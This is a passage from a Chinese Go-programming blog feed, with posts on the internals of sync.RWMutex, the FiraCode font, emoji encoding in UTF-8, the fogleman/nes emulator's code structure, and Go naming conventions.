<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Line61:</div><div class="line">	<span class="keyword">if</span> r := atomic.AddInt32(&amp;rw.readerCount, <span class="number">-1</span>); r &lt; <span class="number">0</span> &#123;</div><div class="line">		<span class="comment">// A writer is pending.</span></div><div class="line">		<span class="keyword">if</span> atomic.AddInt32(&amp;rw.readerWait, <span class="number">-1</span>) == <span class="number">0</span> &#123;</div><div class="line">			<span class="comment">// The last reader unblocks the writer.</span></div><div class="line">			runtime_Semrelease(&amp;rw.writerSem)</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>在读者数量减一的时候，它发现读者数量是负数，这回读者1明白了，有一个写者在等待写。估计读者1自己已经在这个写者的<del>小本本</del>readerWait上了，因此它把readerWait减一，表示自己不读了。这时候读者1发现自己就是最后一个读者了，所以赶紧祭出writerSem，让写者可以去写。<br>读者1释放了writerSem信号量以后，写者很快就收到了这个提醒，兴高采烈地获得了写锁，开始自己的写作生涯。</p>
<p>读者2还卡着呢…</p>
<p>第五秒，写者1写完了一稿便不想写了，调用Unlock()准备释放读锁。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Line114:</div><div class="line">	<span class="comment">// Announce to readers there is no active writer.</span></div><div class="line">	r := atomic.AddInt32(&amp;rw.readerCount, rwmutexMaxReaders)</div><div class="line"></div><div class="line">	<span class="comment">// Unblock blocked readers, if any.</span></div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="keyword">int</span>(r); i++ &#123;</div><div class="line">		runtime_Semrelease(&amp;rw.readerSem)</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>只见他重新为readerCount加上rwmutexMaxReaders，使他重新变为了正数。这个正数恰好也是阻塞的读者的数量。<br>接下来，写者按照这个读者的数量，释放了这么多的readerSem信号量，相当于将所有阻塞的读者一一唤醒。读者2在收到readerSem的那一刻喜极而泣，它终于可以读了。</p>
<p>第六秒，读者1又来了，它把读者数量加1，发现它是正数哎，写者现在又没来，它再次幸运地瞬间获得读锁，与读者2一起读了起来。</p>
<p>第七秒，读者1和读者2都释放了自己的读锁。至此，结束。</p>
<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><table>
<thead>
<tr>
<th>中文</th>
<th>英文</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>信号量 （也称信号灯）</td>
<td>Semaphore</td>
<td></td>
</tr>
<tr>
<td>条件变量</td>
<td>Condition</td>
<td></td>
</tr>
<tr>
<td>互斥量</td>
<td>Mutex</td>
</tr>
</tbody>
</table>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li><a href="https://en.wikipedia.org/wiki/Semaphore_(programming" target="_blank" rel="noopener">Wikipedia: Semaphore (programming)</a>)</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;源码级剖析Go标准库中的sync.RWMutex。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="go" scheme="http://zablog.me/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>每周一个Github项目【第七期】FiraCode</title>
    <link href="http://zablog.me/2017/09/24/github_firacode/"/>
    <id>http://zablog.me/2017/09/24/github_firacode/</id>
    <published>2017-09-24T03:30:00.000Z</published>
    <updated>2017-09-25T03:55:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>具备编程连字功能的等宽字体 // monospaced font with programming ligatures<br><a id="more"></a></p>
<table>
<thead>
<tr>
<th>名称</th>
<th>FiraCode</th>
</tr>
</thead>
<tbody>
<tr>
<td>地址</td>
<td><a href="https://github.com/gohugoio/hugo" target="_blank" rel="noopener">Github</a></td>
</tr>
<tr>
<td>作者</td>
<td>tonsky等</td>
</tr>
<tr>
<td>Brief Intro</td>
<td>monospaced font with programming ligatures</td>
</tr>
<tr>
<td>LICENSE</td>
<td>SIL Open Font License 1.1</td>
</tr>
<tr>
<td>starts</td>
<td>17,400</td>
</tr>
</tbody>
</table>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>程序员在编程的时候会使用很多符号。在某些编程语言中，一个逻辑令牌可能由2至3个字符构成，譬如<code>-&gt;</code>，<code>&lt;=</code>或<code>==</code>。<br>理想情况下，所有的编程语言都应该为操作员设计出完整的Unicode符号，但现在还没有。</p>
<p>Fira代码是Fira Mono字体的扩展，包含一组通用编程多字符组合的连字。这只是一个字体渲染功能：底层代码保持ASCII兼容，这有助于更快地阅读和理解代码。<br>另外，对于某些频繁的序列，如..或//，连字可以让我们纠正间距。</p>
<p>所有特殊字体：<br><img src="https://github.com/tonsky/FiraCode/raw/master/showcases/all_ligatures.png" alt="all_ligatures"></p>
<h2 id="编程样例"><a href="#编程样例" class="headerlink" title="编程样例"></a>编程样例</h2><p>Ruby：<br><img src="https://github.com/tonsky/FiraCode/raw/master/showcases/ruby.png" alt="Ruby"></p>
<p>Elixir:<br><img src="https://github.com/tonsky/FiraCode/raw/master/showcases/elixir.png" alt="elixir"></p>
<p>Go:<br><img src="https://github.com/tonsky/FiraCode/raw/master/showcases/go.png" alt="Go"></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>对于Mac系统来说，安装FiraCode还是比较容易的，只需要运行两条命令即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">brew tap caskroom/fonts</div><div class="line">brew cask install font-fira-code</div></pre></td></tr></table></figure>
<p>在系统中安装之后，还需要在对应的代码编辑器中进行适配，以VS Code为例，点击<code>⌘</code>+<code>,</code>，然后把以下代码粘贴进去即可：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">"editor.fontFamily": "Fira Code",</div><div class="line">"editor.fontLigatures": true</div></pre></td></tr></table></figure>
<p>届时安装完毕。这时<code>-&gt;</code>的显示就变成了<code>→</code>咯。当然作为等款字体，它和<code>→</code>还不太一样，还是会占据两个字符宽度的。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;具备编程连字功能的等宽字体 // monospaced font with programming ligatures&lt;br&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="Github Every Week" scheme="http://zablog.me/tags/Github-Every-Week/"/>
    
  </entry>
  
  <entry>
    <title>Emoji与Unicode</title>
    <link href="http://zablog.me/2017/09/18/emoji/"/>
    <id>http://zablog.me/2017/09/18/emoji/</id>
    <published>2017-09-18T03:00:00.000Z</published>
    <updated>2017-09-18T06:21:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>Unicode的资源是非常宝贵的，而emoji的表情真的是越来越多，那么emoji是如何编码的呢？<br><a id="more"></a><br>在普通的聊天软件中，譬如QQ，一些基本表情是采用普通字符的转义表示。譬如在字符串中检测到<code>[微笑]</code>，就自动替换为表情。<br>但是Emoji是一种特殊的字符，它是真正被编码入Unicode的字符。它在字符集里占据了U+1F300到U+1F9EF中的部分范围。</p>
<p>但是为了实现丰富的Emoji，这种表情不一定只占据一个字符，尤其是为了实现<a href="https://emojipedia.org/neutral/" target="_blank" rel="noopener">emoji中立</a>的时候，就需要1-2个字符来完成一个表情，最多需要7个字符。</p>
<p>现在用一段代码来举例 ：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></div><div class="line"><span class="keyword">import</span> <span class="string">"unicode/utf8"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	strs := []<span class="keyword">string</span>&#123;<span class="string">`Golang够浪`</span>, <span class="string">`a`</span>, <span class="string">`©`</span>, <span class="string">``</span>, <span class="string">`🐵`</span>, <span class="string">`👲🏻`</span>, <span class="string">`👲🏿`</span>, <span class="string">`💇🏽‍♂️`</span>, <span class="string">`👨‍👨‍👦‍👦`</span>&#125;</div><div class="line">	<span class="keyword">for</span> _, str := <span class="keyword">range</span> strs &#123;</div><div class="line">		fmt.Printf(<span class="string">"%s, rune count:%d, len:%d\n"</span>, str, utf8.RuneCountInString(str), <span class="built_in">len</span>(str))</div><div class="line">		<span class="keyword">for</span> _, theRune := <span class="keyword">range</span> str &#123;</div><div class="line">			fmt.Printf(<span class="string">"%s : 0x%x | "</span>, <span class="keyword">string</span>(theRune), theRune)</div><div class="line">		&#125;</div><div class="line">		fmt.Print(<span class="string">"\n------\n"</span>)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><a href="https://play.golang.org/p/tnSsUw0nvf" target="_blank" rel="noopener"><em>到 Playground中运行一下，查看结果</em></a></p>
<p>我们来逐段分析每一个内容。</p>
<p>字串<code>Golang够浪</code>一共有8个字符，其中<code>Golang</code>这六个字符，每个字符在utf8里占据1个字节的空间，而词语<code>够浪</code>中的每个汉字占据3个字节的空间。</p>
<p><code>a</code>这种最基本的内容，在utf8里只占据1个字节，因为它们太常见了，依霍夫曼编码的思路，也必然应当使用短小的编码方式。</p>
<p><code>©</code>是一个相对比较常见的符号，但是又不在0~127这128个最基本的字符中，在utf8中占据2个字节。</p>
<p><code></code>这个字符是苹果公司的logo，别的操作系统不一定能够正确显示，相对来说非常不常见，在utf8中占据3个字节。在Mac系统中，只需要同时按下<code>⇧</code>（shift）+ <code>⌥</code>（option）+ <code>K</code> 即可。</p>
<p><code>🐵</code>是一个猴子emoji表情，在utf8中占据4个字节。多数emoji表情都占据4个字节。</p>
<p><code>👲🏻</code>是一个戴着中国帽的中国男人，它需要由<code>👲</code>戴着中国帽的男人，与<code>🏻</code>黄种肤色放在一起，两个字符拼凑而成，共需要8个字节。</p>
<p>同样地，<code>👲🏿</code>是一个戴着中国帽的黑人男人，它需要由<code>👲</code>戴着中国帽的男人，与<code>🏿</code>黑人肤色放在一起，两个字符拼凑而成，共需要8个字节。</p>
<p><code>💇🏽‍♂️</code>剪头发的棕色人种男人由<code>💇‍</code>剪头发的普通女人加上<code>🏽‍</code>棕色肤色，加上200d连接符，再加上‍♂男性符号，最后加上U+fe0f符号构成，一共耗费17个字节。这一版本的Mac和iOS系统可能还显示不出来，新版本iOS推出以后估计就能显示出来了。</p>
<p>最长的，也是最能够体现中立性质的一个emoji表情是<code>👨‍👨‍👦‍👦</code>，它代表着<code>两个爸爸和两个儿子一家</code>。它由7个字符组成，分别是👨 : U+1f468 普通男人 | ‍ : U+200d 连接符 | 👨 : U+1f468 普通男人 | ‍ : U+200d 连接符 | 👦 : U+1f466  普通男孩 | ‍ : U+200d  连接符 | 👦 : U+1f466 普通男孩 | 组成。</p>
<p>相信这对你理解utf8和unicode概念上的区别也有帮助😆 ~ Enjoy the Emoji!🙂</p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>Emoji在不同的平台上的显示是不同的，参考<a href="https://apps.timwhitlock.info/emoji/tables/unicode#block-1-emoticons" target="_blank" rel="noopener">Emoji Unicode Tables</a>，总体来说Apple的Emoji实现最尊重原版。</p>
<p>Emoji随着时间的推移在不断地丰富，按照年份，版本也在不断整张，参考<a href="http://unicode.org/emoji/charts/emoji-versions.html" target="_blank" rel="noopener">emoji-versions</a></p>
<p>Unicode 10.0在22个块中使用1,182个字符的表情符号标识，其中1,085个是单个表情符号，26个是区分指示符符号、成对组合形成标志表情符号，12个（＃，*和0-9）是键帽的基本字符emoji序列。</p>
<p>杂项符号和象形图块中768个代码点中的637个被认为是表情符号。补充符号和象形图块中148个代码点中的134个被认为是表情符号。表情符号块中的所有80个代码点都被认为是表情符号。运输和地图符号块中的107个代码点中的94个被认为是表情符号。杂项符号块中的256个代码点中的80个被认为是表情符号。Dingbats块中192个代码点中的33个被认为是表情符号。</p>
<p>所谓<a href="https://emojipedia.org/neutral/" target="_blank" rel="noopener">emoji中立</a>就是防止歧视。表情应该是无种族的，应该是无性别特异性的，同样一个表情应该拥有各种肤色，有男有女。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li><a href="https://en.wikipedia.org/wiki/Emoji" target="_blank" rel="noopener">Emoji - Wikipedia</a></li>
<li><a href="https://gist.github.com/x7hub/ecacd20401042d61f68f" target="_blank" rel="noopener">Emoji表情传输和保存：对非BMP范围的Unicode字符的处理</a></li>
<li><a href="https://apps.timwhitlock.info/emoji/tables/unicode#block-1-emoticons" target="_blank" rel="noopener">Emoji Unicode Tables</a></li>
<li><a href="http://www.unicode.org/Public/emoji/5.0/emoji-data.txt" target="_blank" rel="noopener">Emoji 5.0 data</a></li>
<li><a href="https://emojipedia.org/neutral/" target="_blank" rel="noopener">Emoji中立</a></li>
<li><a href="http://newping.cn/447" target="_blank" rel="noopener">Mac——如何输入⌘、⌥、⇧、⌃、⎋等特殊字符（链接1）</a>、 <a href="http://blog.sina.com.cn/s/blog_5656bf3e0102w3ic.html" target="_blank" rel="noopener">（链接2）</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Unicode的资源是非常宝贵的，而emoji的表情真的是越来越多，那么emoji是如何编码的呢？&lt;br&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="go" scheme="http://zablog.me/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>每周一个Github项目【第六期】nes</title>
    <link href="http://zablog.me/2017/09/12/github_nes/"/>
    <id>http://zablog.me/2017/09/12/github_nes/</id>
    <published>2017-09-12T09:30:00.000Z</published>
    <updated>2017-09-12T13:12:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>一个用Go实现的NES模拟器 // NES emulator written in Go.<br><a id="more"></a></p>
<table>
<thead>
<tr>
<th>名称</th>
<th>nes</th>
</tr>
</thead>
<tbody>
<tr>
<td>地址</td>
<td><a href="https://github.com/fogleman/nes" target="_blank" rel="noopener">Github</a></td>
</tr>
<tr>
<td>作者</td>
<td>fogleman</td>
</tr>
<tr>
<td>Brief Intro</td>
<td>NES emulator written in Go.</td>
</tr>
<tr>
<td>LICENSE</td>
<td>MIT</td>
</tr>
<tr>
<td>starts</td>
<td>2,816</td>
</tr>
</tbody>
</table>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>这是一个使用Go实现的NES模拟器。</p>
<p><img src="https://camo.githubusercontent.com/528b888320bf91dc045537bd738303937f780e72/687474703a2f2f692e696d6775722e636f6d2f764433465856682e706e67" alt="NES"></p>
<h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">github.com/go-gl/gl/v2.1/gl</div><div class="line">github.com/go-gl/glfw/v3.1/glfw</div><div class="line">github.com/gordonklaus/portaudio</div></pre></td></tr></table></figure>
<p>portaudio-go依赖需要在系统中安装PortAudio</p>
<p>在ubuntu上，需要执行<code>apt-get install portaudio19-0dev</code>即可，在Mac系统，需要执行<code>brew install portaudio</code></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用go get指令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">go get github.com/fogleman/nes</div></pre></td></tr></table></figure>
<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nes [rom_file|rom_directory]</div></pre></td></tr></table></figure>
<h2 id="评价"><a href="#评价" class="headerlink" title="评价"></a>评价</h2><p>NES是童年时很多人的挚爱，它的全称是Nintendo Entertainment System，也就是俗称的红白机。当年国内的小霸王就是对NES的盗版。<br>NES上有众多让人印象深刻的游戏，譬如马里奥系列、魂斗罗、松鼠大战、双截龙、泡泡龙等等。那是一个经典游戏的辉煌与井喷的年代。</p>
<h2 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h2><p>本nes工程，是对NES白皮书的一种go的实现。<br>代码中涉及了很多相对底层和硬件的内容，乍一看可能灰色难懂。这里可以循一条线来带你看懂nes的代码。</p>
<p>首先关注主目录下的文件结构。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">├── LICENSE.md</div><div class="line">├── README.md</div><div class="line">├── main.go</div><div class="line">├── nes</div><div class="line">│   ├── apu.go</div><div class="line">│   ├── cartridge.go</div><div class="line">│   ├── console.go</div><div class="line">│   ├── controller.go</div><div class="line">│   ├── cpu.go</div><div class="line">│   ├── filter.go</div><div class="line">│   ├── ines.go</div><div class="line">│   ├── mapper.go</div><div class="line">│   ├── mapper1.go</div><div class="line">│   ├── mapper2.go</div><div class="line">│   ├── mapper3.go</div><div class="line">│   ├── mapper4.go</div><div class="line">│   ├── mapper7.go</div><div class="line">│   ├── memory.go</div><div class="line">│   ├── palette.go</div><div class="line">│   └── ppu.go</div><div class="line">├── ui</div><div class="line">│   ├── audio.go</div><div class="line">│   ├── director.go</div><div class="line">│   ├── font.go</div><div class="line">│   ├── gameview.go</div><div class="line">│   ├── menuview.go</div><div class="line">│   ├── run.go</div><div class="line">│   ├── texture.go</div><div class="line">│   └── util.go</div><div class="line">└── util</div><div class="line">    └── roms.go</div></pre></td></tr></table></figure>
<p>直接放在root下的代码文件只有main.go，直接决定了nes这个可执行文件运行之后运行的代码。main.go在整个工程里是最易懂的代码了，简单来说就是判断一下参数，然后调用<code>ui.Run(nes文件路径)</code>。这条线索待会继续跟踪…</p>
<p>再来看主目录下面的文件夹们。nes文件夹主要负责nes文件的格式解析支持，ui负责界面与交互，util主要用来测试rom。（个人认为把util放在这里，并且起这个名字，从项目结构上不妥）</p>
<p>下面从nes/ui/run.go入手， 毕竟main函数调用了ui的Run函数，而Run函数可以看做是ui这个包的入口。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// run.go</span></div><div class="line"><span class="keyword">package</span> ui</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"log"</span></div><div class="line">	<span class="string">"runtime"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/go-gl/gl/v2.1/gl"</span></div><div class="line">	<span class="string">"github.com/go-gl/glfw/v3.1/glfw"</span></div><div class="line">	<span class="string">"github.com/gordonklaus/portaudio"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="keyword">const</span> (</div><div class="line">	width  = <span class="number">256</span></div><div class="line">	height = <span class="number">240</span></div><div class="line">	scale  = <span class="number">3</span></div><div class="line">	title  = <span class="string">"NES"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="comment">// we need a parallel OS thread to avoid audio stuttering</span></div><div class="line">	runtime.GOMAXPROCS(<span class="number">2</span>)</div><div class="line"></div><div class="line">	<span class="comment">// we need to keep OpenGL calls on a single thread</span></div><div class="line">	runtime.LockOSThread()</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Run</span><span class="params">(paths []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	<span class="comment">// initialize audio</span></div><div class="line">	portaudio.Initialize()</div><div class="line">	<span class="keyword">defer</span> portaudio.Terminate()</div><div class="line"></div><div class="line">	audio := NewAudio()</div><div class="line">	<span class="keyword">if</span> err := audio.Start(); err != <span class="literal">nil</span> &#123;</div><div class="line">		log.Fatalln(err)</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">defer</span> audio.Stop()</div><div class="line"></div><div class="line">	<span class="comment">// initialize glfw</span></div><div class="line">	<span class="keyword">if</span> err := glfw.Init(); err != <span class="literal">nil</span> &#123;</div><div class="line">		log.Fatalln(err)</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">defer</span> glfw.Terminate()</div><div class="line"></div><div class="line">	<span class="comment">// create window</span></div><div class="line">	glfw.WindowHint(glfw.ContextVersionMajor, <span class="number">2</span>)</div><div class="line">	glfw.WindowHint(glfw.ContextVersionMinor, <span class="number">1</span>)</div><div class="line">	window, err := glfw.CreateWindow(width*scale, height*scale, title, <span class="literal">nil</span>, <span class="literal">nil</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		log.Fatalln(err)</div><div class="line">	&#125;</div><div class="line">	window.MakeContextCurrent()</div><div class="line"></div><div class="line">	<span class="comment">// initialize gl</span></div><div class="line">	<span class="keyword">if</span> err := gl.Init(); err != <span class="literal">nil</span> &#123;</div><div class="line">		log.Fatalln(err)</div><div class="line">	&#125;</div><div class="line">	gl.Enable(gl.TEXTURE_2D)</div><div class="line"></div><div class="line">	<span class="comment">// run director</span></div><div class="line">	director := NewDirector(window, audio)</div><div class="line">	director.Start(paths)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>它所依赖的包就不多说了，与上文所述的依赖一致。</p>
<p>第一个函数是init()函数。看起来这个函数在整个工程中并没有被调用，其实不然。Go里面有两个保留函数，分别是init函数和main函数，其中init函数能够应用于所有的package，而main函数只能应用于main package。当某一个包被引入的时候，首先会引入自身的其他依赖，然后初始化常量，初始化全局变量，接下来就会自动调用这个package的init()函数。</p>
<p>可以在一个package下的多个文件中都定义init()函数，然而这样不是很便于管理，建议每个package最多写一个init()函数。<br>nes的作者就写了很多个init()函数。</p>
<p>init的内容是把runtime.GOMAXPROCS设置为2。runtime.GOMAXPROCS可以认为是Go语言最多使用的核心数目，在不设置的时候默认是1。<br>较大的GOMAXPROCS适合于CPU密集型，且并发度较高的情形。如果是IO密集型，CPU之间的切换反而会带来较大的性能损失。<br>nes中的GOMAXPROCS设置，是为了在执行任务的时候，音效不要卡顿。<br>接下来作者调用了runtime.LockOSThread(),这保证了调用OpenGL的时候，go只有一个线程去访问OpenGL的接口。</p>
<p>在执行Run的时候，NES首先初始化音频部件，然后初始化glfw，接下来使用glfw创建一个窗口，</p>
<p>glfw是一个C的OpenGL库，而<a href="https://github.com/go-gl/glfw/" target="_blank" rel="noopener">go glfw</a>则是一个典型的C与GO混合开发的一个库。</p>
<p>下面，NES初始化了gl，使用TEXTURE_2D模式。</p>
<p>最终，新建了一个Director，并执行这个Director，至此Run函数结束。</p>
<h2 id="Director"><a href="#Director" class="headerlink" title="Director"></a>Director</h2><p>Director导演的作用主要是对操作进行一个分发。如果当前有游戏的话，那么就加载游戏的GameView；如果是一个大列表，就把列表展示出来，让用户可以选择一个nes游戏执行。</p>
<h2 id="按键"><a href="#按键" class="headerlink" title="按键"></a>按键</h2><p>令人伤感的是，作者把按键适配写死在代码里，而且如果只有键盘的话，只能单人玩，简直是不能忍呀。具体的按键写死的代码在util.go中，有兴趣的小朋友可以给他改了。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">readKeys</span><span class="params">(window *glfw.Window, turbo <span class="keyword">bool</span>)</span> [8]<span class="title">bool</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> result [<span class="number">8</span>]<span class="keyword">bool</span></div><div class="line">	result[nes.ButtonA] = readKey(window, glfw.KeyZ) || (turbo &amp;&amp; readKey(window, glfw.KeyA))</div><div class="line">	result[nes.ButtonB] = readKey(window, glfw.KeyX) || (turbo &amp;&amp; readKey(window, glfw.KeyS))</div><div class="line">	result[nes.ButtonSelect] = readKey(window, glfw.KeyRightShift)</div><div class="line">	result[nes.ButtonStart] = readKey(window, glfw.KeyEnter)</div><div class="line">	result[nes.ButtonUp] = readKey(window, glfw.KeyUp)</div><div class="line">	result[nes.ButtonDown] = readKey(window, glfw.KeyDown)</div><div class="line">	result[nes.ButtonLeft] = readKey(window, glfw.KeyLeft)</div><div class="line">	result[nes.ButtonRight] = readKey(window, glfw.KeyRight)</div><div class="line">	<span class="keyword">return</span> result</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上述代码规定Z和X对应红白机的A和B键。</p>
<p>虽然按键不尽如人意，但是fogleman的令人拍案称奇的作品确实还是太多了，估计没时间做nes的按键适配了吧。况且毕竟glfw并不特别方便进行窗口编程。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li><a href="https://stackoverflow.com/questions/25361831/benefits-of-runtime-lockosthread-in-golang" target="_blank" rel="noopener">Benefits of runtime.LockOSThread in Golang - Stackoverflow</a></li>
<li><a href="https://github.com/golang/go/wiki/LockOSThread" target="_blank" rel="noopener">LockOSThread</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一个用Go实现的NES模拟器 // NES emulator written in Go.&lt;br&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="Github Every Week" scheme="http://zablog.me/tags/Github-Every-Week/"/>
    
  </entry>
  
  <entry>
    <title>Go语言小技巧--二 命名规范</title>
    <link href="http://zablog.me/2017/09/08/go_tricks_and_tips_2/"/>
    <id>http://zablog.me/2017/09/08/go_tricks_and_tips_2/</id>
    <published>2017-09-08T03:00:00.000Z</published>
    <updated>2017-10-09T12:37:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>本篇主要讲述Go语言的命名规范。<br>优秀的代码必须具备良好的可读性，而可读性的关键即在于命名风格。</p>
<a id="more"></a>
<p><a href="http://zablog.me/2017/09/08/go_tricks_and_tips_2/">原文链接: http://zablog.me/2017/09/08/go_tricks_and_tips_2/</a></p>
<h2 id="优秀的命名"><a href="#优秀的命名" class="headerlink" title="优秀的命名"></a>优秀的命名</h2><p>优秀的命名应当是一贯的、短小的、精确的。<br>所谓一贯，就是说同一个意义在不同的环境下的命名应当一致，譬如依赖关系，不要在一个方法中命名为depend，另一个方法中命名为rely。<br>所谓短小，不必多言，当命名过长的时候，读者可能更关注命名本身，而忽视真正的逻辑内容。<br>所谓精确，就是命名达意、易于理解</p>
<h2 id="首条经验"><a href="#首条经验" class="headerlink" title="首条经验"></a>首条经验</h2><p>声明位置与使用位置越远，则命名应当越长。</p>
<h2 id="骆驼命名法"><a href="#骆驼命名法" class="headerlink" title="骆驼命名法"></a>骆驼命名法</h2><p>Go语言应该使用 MixedCase<br>(不要使用 names_with_underscores)<br>首字母缩写词都应该用大写,譬如<code>ServeHTTP</code>、<code>sceneID</code>、<code>CIDRProcessor</code>。</p>
